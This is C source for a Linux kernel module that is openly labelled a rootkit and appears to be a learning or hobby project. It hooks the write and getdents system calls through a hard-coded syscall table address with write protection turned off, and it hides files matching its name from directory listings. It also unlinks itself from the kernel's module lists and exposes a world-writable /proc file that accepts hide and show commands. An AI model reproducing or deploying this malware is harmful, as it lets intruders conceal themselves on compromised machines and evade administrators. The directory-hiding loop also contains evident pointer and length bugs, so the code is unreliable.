#include "ker_mod.h"

static struct proc_dir_entry *proc_rtkit;
static struct proc_dir_entry *proc_root;

static char module_hidden = 0;
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static int temp;
static char desc[50];

// unsigned long *syscall_table = NULL;
unsigned long* syscall_table = (unsigned long*)0xffffffff816001e0;
// found with grep sys_call_table /boot/System.map-4.* | head -n 1 | awk '{print $1}'
//typedef asmlinkage long (*original_stuff) (const char *, int, mode_t);
//original_stuff original_write;
asmlinkage long (*original_write)(unsigned int,
                                  const char __user *,
                                  size_t);
asmlinkage long (*original_getdents)(unsigned int,
                                struct linux_dirent64 __user *,
                                unsigned int);

asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
{
    // printk(KERN_ALERT "test write");
    return original_write(i,u,s);
}

/*
 * Overriding getdents function
 * Arguments :
 * fd = file descriptor, reffering the directory
 * dirp = buffer for linux_dirent structure
 * count = size of the buffer
 */
asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    unsigned int tmp, i;
    struct linux_dirent64 __user *new_dir;

    tmp = (*original_getdents)(fd, dirp, count);
    new_dir = (struct linux_dirent64 __user *) kmalloc(tmp, GFP_KERNEL);
    memcpy(new_dir, dirp, tmp);
    //char hide[] = "ker_mod";
    i = 0;
    printk(KERN_ALERT "test: %u\n", count);
    while (i < count) {
        if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
            printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
            int reclen = new_dir->d_reclen;
            char* next_rec = (char *)new_dir + reclen;
            printk(KERN_ALERT "test new_dir: %s\n", next_rec);
            int len = (int)dirp + tmp - (int)next_rec;
            memmove(new_dir, next_rec, len);
            printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
            tmp -= reclen;
            continue;
        }
        i += new_dir->d_reclen-1;
        new_dir = (struct linux_dirent64*)((char *)dirp + new_dir->d_reclen-1);
        printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
    }
    return tmp;
}

void module_hide(void)
{
		/* The module is already hidden, do nothing. */
		if(module_hidden) return;

		module_previous = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
		// kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->mkobj.kobj.entry);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Module hidden\n");
}

void module_show(void)
{
		/* The module is not hidden yet, nothing more to show. */
		if(!module_hidden) return;

		list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
		// kobject_init(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.ktype);
		// kobject_add(&THIS_MODULE->mkobj.kobj,
		// 	THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
		list_add(&THIS_MODULE->list, module_previous);
		// mod_sysfs_setup(&THIS_MODULE, NULL, &THIS_MODULE->kp, 0);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Module no longer hidden\n");
}

static ssize_t rtkit_read(struct file *file, char __user *buffer,
													size_t count, loff_t *ppos)
{
		if(count > temp)
				count = temp;
		temp -= count;

		if(!copy_to_user(buffer, desc, count))
      return -1;

		if(count == 0) {
				sprintf(desc, "test\n");
				temp = strlen(desc);
		}

		return count;
}

static ssize_t rtkit_write(struct file *file, const char __user *buffer,
													 size_t count, loff_t *ppos)
{
		if(!strncmp(buffer, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD))) {
				module_hide();
		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
				module_show();
		}
		return count;
}

static const struct file_operations rootkit_fops = {
		.owner = THIS_MODULE,
		.read = rtkit_read,
		.write = rtkit_write,
};

/* Initialize proc file system */
static int procfs_init(void)
{
		proc_rtkit = proc_create(MODULE_NAME, 0666, NULL, &rootkit_fops);
		if(proc_rtkit == NULL)
				return 0;
		proc_root = proc_rtkit->parent;
		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
				return 0;

		sprintf(desc, "test\n");
		temp = strlen(desc);

		return 1;
}

static void procfs_clean(void)
{
		if(proc_rtkit != NULL) {
				remove_proc_entry(MODULE_NAME, NULL);
				proc_rtkit = NULL;
		}
}

/* Init function, called when the module is loaded */
static int __init rootkit_init(void)
{
		if(!procfs_init()) {
				procfs_clean();
				return 1;
		}
    original_getdents = (void*)syscall_table[__NR_getdents];
    original_write = (void*)syscall_table[__NR_write];
    /* Making sys_call_table read/write */
    GPF_DISABLE();
    syscall_table[__NR_getdents] = (long)custom_getdents;
    syscall_table[__NR_write] = (long)custom_write;
    /* sys_call_table back to read-only */
    GPF_ENABLE();
    printk(KERN_INFO "Loading rootkit\n");
		return 0;
}

/* Exit function, called when the module is unloaded */
static void __exit rootkit_exit(void)
{
		module_show();
		procfs_clean();
		module_hide();
    /* Making sys_call_table read/write */
    GPF_DISABLE();
    syscall_table[__NR_write] = (long)original_write;
    syscall_table[__NR_getdents] = (long)original_getdents;
    /* sys_call_table back to read-only */
    GPF_ENABLE();
		printk(KERN_INFO "Closing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);